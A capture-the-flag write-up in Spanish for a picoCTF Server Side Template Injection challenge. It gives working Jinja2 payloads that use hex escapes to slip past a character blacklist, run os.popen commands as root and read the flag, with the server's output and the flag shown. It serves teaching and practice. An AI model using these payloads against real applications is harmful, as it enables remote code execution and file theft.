**Challenge**
	
**Description**
	I made a cool website where you can announce whatever you want! I read about input sanitization, so now I remove any kind of characters that could be a problem :)
	I heard templating is a cool and modular way to build web apps! Check out my website [here](http://shape-facility.picoctf.net:58584/)!
	**Hints**
		1. Server Side Template Injection
		2. Why is blacklisting characters a bad idea to sanitize input?

**Solution**
	1. **Identificar la vulnerabilidad**
	    - El sitio usa plantillas (templating).
	    - El input del usuario se renderiza directamente → vulnerable a **SSTI**.
	2. **Evadir el filtro**
	    - No se pueden usar caracteres normales (`__`, etc.).
	    - Se usan equivalentes en hexadecimal:
	        - `_` → `\x5f`
	    - Así se evita el blacklist.
	3. **Ejecutar código en el servidor**
	    - Payload para ejecutar `id`:
		`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}`
		- Confirma ejecución remota (root).
	4. **Listar archivos**
		`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls -al')|attr('read')()}}`
		- Se observa un archivo llamado `flag`.
	5. **Leer la flag**
		`{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}`
	6. Ejecución de cada templating en el sitio:
		- {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
			<html><head><link rel="stylesheet" href="chrome-extension://b44f19d4-64b1-4a8e-b499-6f7a15008f6b/app/content-style.css"></head><body><h1 style="font-size:100px;" align="center">uid=0(root) gid=0(root) groups=0(root)
			</h1></body></html>
		- {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('ls -al')|attr('read')()}}
			<html><head><link rel="stylesheet" href="chrome-extension://b44f19d4-64b1-4a8e-b499-6f7a15008f6b/app/content-style.css"></head><body><h1 style="font-size:100px;" align="center">total 12
			drwxr-xr-x 1 root root   25 Mar 24 15:12 .
			drwxr-xr-x 1 root root   23 Mar 24 15:12 ..
			drwxr-xr-x 2 root root   32 Mar 24 15:12 __pycache__
			-rwxr-xr-x 1 root root 1841 May  1  2025 app.py
			-rw-r--r-- 1 root root   36 Aug 21  2025 flag
			-rwxr-xr-x 1 root root  268 May  1  2025 requirements.txt
			</h1></body></html>
		- {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('cat flag')|attr('read')()}}
			<html><head><link rel="stylesheet" href="chrome-extension://b44f19d4-64b1-4a8e-b499-6f7a15008f6b/app/content-style.css"></head><body><h1 style="font-size:100px;" align="center">picoCTF{sst1_f1lt3r_byp4ss_3cfcf706}</h1></body></html>

**Notes**
	1. SSTI
	    - Permite ejecutar código en el servidor desde el input.
	2. Bypass de filtros
	    - Blacklist es débil → se puede evadir con encoding (`\x5f`).
	3. Cadena del ataque
	    - Acceso a `__globals__`
	    - Acceso a `__builtins__`
	    - Uso de `__import__`
	    - Ejecución de comandos con `os.popen`
	4. Idea clave
	    - Si puedes ejecutar comandos → puedes leer archivos → obtener flag.

**References**
	https://onsecurity.io/article/server-side-template-injection-with-jinja2/